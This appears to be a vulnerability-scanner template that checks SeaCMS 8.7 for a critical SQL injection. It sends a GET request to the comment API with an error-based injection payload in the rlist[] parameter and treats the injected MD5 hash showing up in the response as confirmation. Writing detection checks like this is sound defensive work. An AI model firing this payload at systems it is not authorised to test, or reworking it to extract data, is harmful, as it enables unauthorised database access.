id: seacms-sqli
brief:
    title: SeaCMS 8.7 - SQL Injection
    by: ritikchaddha
    level: critical
    about: SeaCMS 8.7 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the cont...
    label:
        - seacms
        - sqli
        - vuln
    score: CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`'
      signs:
        - "on": word
          has:
            - '{{md5({{num}})}}'
          in: body
          need: all
        - "on": status
          status:
            - 200
